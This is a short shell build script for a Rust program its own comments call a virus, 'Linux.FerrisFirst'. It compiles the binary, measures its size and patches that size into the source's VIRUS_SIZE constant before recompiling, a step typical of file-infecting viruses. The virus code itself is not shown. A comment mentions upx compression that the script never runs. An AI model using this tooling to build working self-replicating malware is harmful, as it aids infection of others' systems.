#!/bin/sh

# The line in source code to match
DECL='const VIRUS_SIZE: usize = '

# Compiler options: no fancy panic, link time optimization, max optimization, no debug_info, strip
OPTS='+nightly -C panic=abort -C lto=y -C opt-level=z -C debuginfo=0 -Z strip=symbols'

# Compile virus once, compress with upx, and get final size
rustc $OPTS ferris-first.rs -o Linux.FerrisFirst || exit
SIZE=`wc Linux.FerrisFirst | awk '{print $3}'`

# Patch `VIRUS_SIZE` in the source code and recompile
sed -i -s "s/${DECL}.*;/${DECL}${SIZE};/g" ferris-first.rs
rustc $OPTS ferris-first.rs -o Linux.FerrisFirst
